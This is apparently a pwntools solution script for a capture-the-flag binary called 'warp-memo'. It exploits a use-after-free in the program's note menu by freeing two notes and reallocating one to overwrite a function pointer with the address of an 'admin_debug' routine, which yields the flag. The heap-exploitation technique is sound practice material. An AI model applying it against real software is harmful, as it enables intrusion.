from pwn import *
import warnings
warnings.filterwarnings('ignore') 


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './warp-memo'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

def addnote(size, content):
    io.recvuntil("\n")
    io.sendline("1")
    io.recvuntil("\n")
    io.sendline(str(size))
    io.recvuntil("\n")
    io.sendline(content)
    io.recvuntil("!")


def delnote(idx):
    io.recvuntil("\n")
    io.sendline("2")
    io.sendline(str(idx))


def printnote(idx):
    io.recvuntil("\n")
    io.sendline("3")
    io.sendline(str(idx))
    io.recvline()


addnote(32, "aaaa")
addnote(32, "aaaa")

delnote(0)
delnote(1)

magic = 0x080495e1 # TODO, dynamically get this addr of admin_debug
addnote(8, p32(magic))

printnote(0)

# Receive the flag
io.interactive()

